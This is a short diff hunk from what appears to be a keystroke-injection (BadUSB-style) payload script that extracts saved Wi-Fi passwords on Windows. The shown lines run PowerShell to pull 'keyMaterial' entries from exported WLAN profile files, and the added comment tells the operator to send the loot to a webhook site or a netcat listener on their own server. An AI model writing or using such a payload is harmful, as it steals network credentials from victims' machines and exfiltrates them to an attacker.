@@ -36,6 +36,7 @@ DELAY 150000
 Q ENTER
 
 ######################Send Data over to webhook link#######################
+############Use a Webhook site for the POST request or the better solution, listen with netcat on your own server and capture the data##############
 
 Q STRING "powershell Select-String -Path WLAN*.xml -Pattern 'keyMaterial' > WLAN-PWD" 
 DELAY 100000
